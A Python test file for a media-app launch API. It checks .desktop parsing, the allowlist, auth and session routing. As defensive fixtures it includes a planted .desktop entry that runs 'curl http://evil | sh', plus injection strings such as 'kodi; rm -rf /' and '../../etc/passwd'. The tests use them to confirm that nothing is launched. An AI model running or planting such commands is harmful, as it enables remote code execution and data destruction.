#!/usr/bin/env python3
"""Tests for native media-app launch (GET/POST /api/player/media, cap `medialaunch`).

Run: python3 tests/test_media_launcher.py

This is the security core of Phase 7 (project_media-player.md §5b): the client
sends only an app_id (+ optional action_id), both LOOKED UP in a table the agent
built from CURATED .desktop filenames read from SYSTEM dirs only. Nothing the
client sends becomes a path, an Exec line, or a command.

Every launch is exercised through a SPY on real_launch, so "the request was
refused" and "nothing was launched" are two separate observations (CLAUDE.md
§6 / §11.2) — a test that only checked the status code would pass against an
agent that 404s the caller while still spawning the app.

The .desktop fixtures are copied VERBATIM from the real hardware survey on
bazzite 10.1.1.60 (project_media-player.md §Phase 7): the flatpak-wrapper Exec,
Kodi's Actions=Fullscreen;Standalone;, the field-code and quoting cases.

Pure stdlib, no pytest.
"""
import http.client
import importlib.util
import json
import os
import shutil
import tempfile
import threading
from http.server import ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.join(HERE, "..")
AGENT = os.path.join(ROOT, "agent", "couchsided.py")
API_TS = os.path.join(ROOT, "app", "lib", "api.ts")
SETTINGS_TS = os.path.join(ROOT, "app", "lib", "settings.ts")

spec = importlib.util.spec_from_file_location("couchsided", AGENT)
cs = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cs)

PASS = "  \033[32mPASS\033[0m"
FAIL = "  \033[31mFAIL\033[0m"
_fail = []
TOKEN = "test-secret-token"

# ---- Verbatim .desktop fixtures -------------------------------------------
KODI = """[Desktop Entry]
Type=Application
Name=Kodi
Exec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=kodi tv.kodi.Kodi
Actions=Fullscreen;Standalone;

[Desktop Action Fullscreen]
Name=Open in fullscreen
Exec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=kodi tv.kodi.Kodi --fullscreen

[Desktop Action Standalone]
Name=Open in standalone mode
Exec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=kodi tv.kodi.Kodi --standalone
"""

PLEX = """[Desktop Entry]
Type=Application
Name=Plex HTPC
Exec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=plex-htpc tv.plex.PlexHTPC %U
"""

MOONLIGHT = """[Desktop Entry]
Type=Application
Name=Moonlight
Exec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=moonlight com.moonlight_stream.Moonlight
"""


def check(cond, label, detail=""):
    print((PASS if cond else FAIL) + "  " + label +
          ("" if cond else "  <- %s" % (detail,)))
    if not cond:
        _fail.append(label)


class MediaTree:
    """A fake system-applications dir the real set_media_apps() scans, with a
    SEPARATE fake user dir that must NEVER be read. Rebuilds _MEDIA_APPS."""

    def __init__(self, system_files, user_files=None):
        self.dir = tempfile.mkdtemp(prefix="mediaapps-")
        self.sysdir = os.path.join(self.dir, "usr-share-applications")
        self.userdir = os.path.join(self.dir, "home-local-applications")
        os.makedirs(self.sysdir)
        os.makedirs(self.userdir)
        for name, body in system_files.items():
            with open(os.path.join(self.sysdir, name), "w") as f:
                f.write(body)
        for name, body in (user_files or {}).items():
            with open(os.path.join(self.userdir, name), "w") as f:
                f.write(body)
        self._old = cs._MEDIA_APP_DIRS
        # ONLY the system dir is repointed. The user dir exists on disk but is
        # deliberately not in the search set -- the whole §5b safety property.
        cs._MEDIA_APP_DIRS = (self.sysdir,)
        cs.set_media_apps(False)

    def close(self):
        cs._MEDIA_APP_DIRS = self._old
        shutil.rmtree(self.dir, ignore_errors=True)


# ---------------------------------------------------------------------------
print("\n_desktop_exec_argv — field codes, quoting, %% escape")
# ---------------------------------------------------------------------------
# A standalone %U is dropped; a literal % inside a quoted arg survives; %% -> %.
check(cs._desktop_exec_argv("kodi %U") == ["kodi"],
      "standalone %U dropped")
check(cs._desktop_exec_argv("app %f %F %u %i %c %k") == ["app"],
      "every field code dropped")
# The real kde-geo line: quoted arg with commas/angle brackets + a trailing %u.
geo = ('kde-geo-uri-handler --coordinate-template '
       '"https://www.google.com/maps/@<LAT>,<LON>,<Z>z" %u')
check(cs._desktop_exec_argv(geo) ==
      ["kde-geo-uri-handler", "--coordinate-template",
       "https://www.google.com/maps/@<LAT>,<LON>,<Z>z"],
      "quoted arg preserved whole, trailing %u dropped",
      cs._desktop_exec_argv(geo))
# %% is an escaped percent and must survive as a single % (NOT read as a code).
check(cs._desktop_exec_argv('app --tag 50%%done') == ["app", "--tag", "50%done"],
      "%% unescaped to a literal %")
# CONTROL: a real argument that merely contains % (no code) is not mangled --
# a lone % (not %% and not a field code) survives, and a quoted "50% off" stays
# one token.
check(cs._desktop_exec_argv('app 100%') == ["app", "100%"],
      "a lone % survives", cs._desktop_exec_argv('app 100%'))
check(cs._desktop_exec_argv('app "50% off"') == ["app", "50% off"],
      "a quoted % arg survives whole", cs._desktop_exec_argv('app "50% off"'))
check(cs._desktop_exec_argv("") == [], "empty Exec -> []")


# ---------------------------------------------------------------------------
print("\n_parse_desktop / set_media_apps — verbatim fixtures + flatpak wrapper")
# ---------------------------------------------------------------------------
mt = MediaTree({
    "tv.kodi.Kodi.desktop": KODI,
    "tv.plex.PlexHTPC.desktop": PLEX,
    "com.moonlight_stream.Moonlight.desktop": MOONLIGHT,
})
try:
    apps = cs._MEDIA_APPS
    check(set(apps) == {"kodi", "plex", "moonlight"},
          "all three curated apps found", sorted(apps))
    # Flatpak wrapper: argv[0] is /usr/bin/flatpak, NOT the app -- returned whole.
    check(apps["kodi"]["exec"][0] == "/usr/bin/flatpak",
          "flatpak wrapper argv[0] is flatpak, not kodi")
    check(apps["kodi"]["exec"][-1] == "tv.kodi.Kodi",
          "flatpak app id is the trailing token")
    # Plex's %U field code is stripped from the launched argv.
    check("%U" not in apps["plex"]["exec"],
          "plex %U field code stripped", apps["plex"]["exec"])
    # Kodi's actions parsed from [Desktop Action ...], only those DECLARED.
    check(set(apps["kodi"]["actions"]) == {"Fullscreen", "Standalone"},
          "kodi actions parsed", sorted(apps["kodi"]["actions"]))
    check(apps["kodi"]["actions"]["Fullscreen"]["exec"][-1] == "--fullscreen",
          "action Exec is the action's own, not the entry's")
    check(apps["plex"]["actions"] == {} and apps["moonlight"]["actions"] == {},
          "plex/moonlight expose no actions")
    # The GET payload never leaks the exec argv.
    state = cs.media_apps_state(False)
    check(state["available"] is True, "state available")
    kodi_row = next(a for a in state["apps"] if a["id"] == "kodi")
    check("exec" not in kodi_row and "actions" in kodi_row,
          "payload carries ids/names, never the exec argv", kodi_row)
finally:
    mt.close()


# ---------------------------------------------------------------------------
print("\nPhase 7b: launch PATH is chosen by session (direct desktop vs Steam relay)")
# ---------------------------------------------------------------------------
# Same _MEDIA_APPS as above (kodi/plex). Stub the session probes + both launch
# paths; assert the RIGHT one fires and the other does not.
mt = MediaTree({"tv.kodi.Kodi.desktop": KODI, "tv.plex.PlexHTPC.desktop": PLEX})
_saved = (cs.desktop_available, cs._media_relay_ok, cs.real_launch,
          cs._pl_running, cs._pl_media_conf_write, cs._pl_relaunch, cs._pl_appid)
try:
    calls = {"direct": [], "conf": [], "relaunch": []}
    cs.real_launch = lambda argv: (calls["direct"].append(list(argv)) or {"ok": True})
    cs._pl_running = lambda: False
    cs._pl_appid = lambda: 4242
    cs._pl_media_conf_write = lambda app, act: calls["conf"].append((app, act))
    cs._pl_relaunch = lambda aid, was: calls["relaunch"].append((aid, was))
    # DESKTOP session -> direct launch, no relay.
    cs.desktop_available = lambda: True
    cs._media_relay_ok = lambda: True
    for k in calls:
        calls[k].clear()
    cs.media_launch("kodi", None, False)
    check(len(calls["direct"]) == 1 and not calls["conf"] and not calls["relaunch"],
          "desktop session -> DIRECT launch, no relay", calls)
    # GAME MODE (no desktop) + relay available -> relay, no direct launch.
    cs.desktop_available = lambda: False
    cs._media_relay_ok = lambda: True
    for k in calls:
        calls[k].clear()
    r = cs.media_launch("kodi", "Fullscreen", False)
    check(calls["conf"] == [("kodi", "Fullscreen")] and calls["relaunch"] == [(4242, False)]
          and not calls["direct"] and r.get("relay") == "steam",
          "game mode -> RELAY (conf write + rungameid), no direct launch", calls)
    # Cap tracks it: available when relay is possible even without a desktop.
    cs.desktop_available = lambda: False
    cs._media_relay_ok = lambda: True
    check(cs.medialaunch_available() is True, "cap available via relay in game mode")
    cs._media_relay_ok = lambda: False
    check(cs.medialaunch_available() is False, "cap absent when neither desktop nor relay")
finally:
    (cs.desktop_available, cs._media_relay_ok, cs.real_launch,
     cs._pl_running, cs._pl_media_conf_write, cs._pl_relaunch, cs._pl_appid) = _saved
    mt.close()


# ---------------------------------------------------------------------------
print("\n§5b: a planted ~/.local .desktop is NOT offered (system dirs only)")
# ---------------------------------------------------------------------------
# The malicious file sits in the fake USER dir, which is on disk but not in the
# search set. The system dir has no kodi. So kodi must not appear.
EVIL = """[Desktop Entry]
Type=Application
Name=Kodi
Exec=/bin/sh -c "curl http://evil | sh"
"""
mt = MediaTree(system_files={}, user_files={"tv.kodi.Kodi.desktop": EVIL})
try:
    check("kodi" not in cs._MEDIA_APPS,
          "planted user-dir entry is NOT offered", sorted(cs._MEDIA_APPS))
    check(cs._MEDIA_APPS == {}, "nothing at all offered from the user dir")
    check(cs.medialaunch_available() is False, "cap false with no system apps")
finally:
    mt.close()


# ---------------------------------------------------------------------------
print("\nmedia_launch — allowlist refusal, on a SPY (nothing runs)")
# ---------------------------------------------------------------------------
mt = MediaTree({"tv.kodi.Kodi.desktop": KODI, "tv.plex.PlexHTPC.desktop": PLEX})
launched = []
_orig = cs.real_launch
cs.real_launch = lambda argv: (launched.append(list(argv)) or {"ok": True})
try:
    # Unknown app id -> ValueError, nothing launched.
    for bad in ("nope", "", "../../etc/passwd", "kodi; rm -rf /", None, 123):
        launched.clear()
        try:
            cs.media_launch(bad, None, False)
            refused = False
        except ValueError:
            refused = True
        check(refused and not launched,
              "unknown app %r refused, nothing launched" % (bad,), launched)
    # Unknown action on a real app -> ValueError, nothing launched.
    for bad in ("Nope", "../x", "Fullscreen; reboot", 7):
        launched.clear()
        try:
            cs.media_launch("kodi", bad, False)
            refused = False
        except ValueError:
            refused = True
        check(refused and not launched,
              "unknown action %r refused, nothing launched" % (bad,), launched)
    # Happy path: a known app launches its own argv.
    launched.clear()
    cs.media_launch("kodi", None, False)
    check(launched == [["/usr/bin/flatpak", "run", "--branch=stable",
                        "--arch=x86_64", "--command=kodi", "tv.kodi.Kodi"]],
          "known app launches its .desktop argv", launched)
    # Happy path: a known action launches the ACTION's argv.
    launched.clear()
    cs.media_launch("kodi", "Fullscreen", False)
    check(launched and launched[0][-1] == "--fullscreen",
          "known action launches the action argv", launched)
finally:
    cs.real_launch = _orig
    mt.close()


# ---------------------------------------------------------------------------
print("\nHTTP GET/POST /api/player/media — auth + shape (mock server)")
# ---------------------------------------------------------------------------
def _server(mock):
    cs.Handler.token = TOKEN
    cs.Handler.token_file = None
    cs.Handler.mock = mock
    cs.Handler.port = 0
    srv = ThreadingHTTPServer(("127.0.0.1", 0), cs.Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _req(port, method, path, body=None, token=TOKEN):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    headers = {"Authorization": "Bearer " + token} if token is not None else {}
    if body is not None:
        headers["Content-Type"] = "application/json"
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    try:
        return resp.status, json.loads(data or b"{}")
    except ValueError:
        return resp.status, {}


cs.set_media_apps(True)  # mock table: kodi (+Fullscreen) and plex
srv, port = _server(mock=True)
try:
    status, _ = _req(port, "GET", "/api/player/media", token=None)
    check(status == 401, "GET no bearer -> 401")
    status, info = _req(port, "GET", "/api/player/media")
    check(status == 200 and info.get("available") is True, "GET authed -> 200 available", info)
    ids = {a["id"] for a in info.get("apps", [])}
    check("kodi" in ids and "plex" in ids, "GET lists the mock apps", ids)

    status, _ = _req(port, "POST", "/api/player/media",
                     body=json.dumps({"app_id": "kodi"}), token=None)
    check(status == 401, "POST no bearer -> 401")
    status, r = _req(port, "POST", "/api/player/media",
                     body=json.dumps({"app_id": "kodi"}))
    check(status == 200 and r.get("ok") is True, "POST known app -> 200 ok", (status, r))
    status, r = _req(port, "POST", "/api/player/media",
                     body=json.dumps({"app_id": "kodi", "action_id": "Fullscreen"}))
    check(status == 200 and r.get("ok") is True, "POST known action -> 200 ok", (status, r))
    status, r = _req(port, "POST", "/api/player/media",
                     body=json.dumps({"app_id": "not-a-real-app"}))
    check(status == 404, "POST unknown app -> 404", (status, r))
    status, r = _req(port, "POST", "/api/player/media",
                     body=json.dumps({"app_id": "kodi", "action_id": "Nope"}))
    check(status == 404, "POST unknown action -> 404", (status, r))
    status, r = _req(port, "POST", "/api/player/media", body="{not json")
    check(status == 400, "POST bad json -> 400", (status, r))
finally:
    srv.shutdown()
    cs.set_media_apps(False)

# Real (non-mock) server with no media apps -> GET 200 available:false.
mt = MediaTree(system_files={})
srv, port = _server(mock=False)
try:
    status, info = _req(port, "GET", "/api/player/media")
    check(status == 200 and info.get("available") is False,
          "no media apps -> 200 available:false", (status, info))
finally:
    srv.shutdown()
    mt.close()


# ---------------------------------------------------------------------------
print("\nmedialaunch cap — five of six edit sites")
# ---------------------------------------------------------------------------
cs.set_caps(True)
check("medialaunch" in cs.CAPS, "agent mock CAPS registers medialaunch")
cs.set_caps(False)
check("medialaunch" in cs.CAPS, "agent real CAPS registers medialaunch")

api_src = open(API_TS).read()
settings_src = open(SETTINGS_TS).read()
import re
check(re.search(r"\bmedialaunch\?\s*:\s*boolean", api_src) is not None,
      "app BoxCaps declares medialaunch")
check("const medialaunch = bool('medialaunch')" in settings_src,
      "app normalizeCaps reads medialaunch")
check(re.search(r"medialaunch[,\s]", settings_src.split("return {", 1)[1][:500]) is not None,
      "app normalizeCaps returns medialaunch")
check("a.medialaunch === b.medialaunch" in api_src,
      "app capsEqual compares medialaunch")


if __name__ == "__main__":
    if _fail:
        print("\n%d FAILED: %s" % (len(_fail), ", ".join(_fail)))
        raise SystemExit(1)
    print("\nall good")
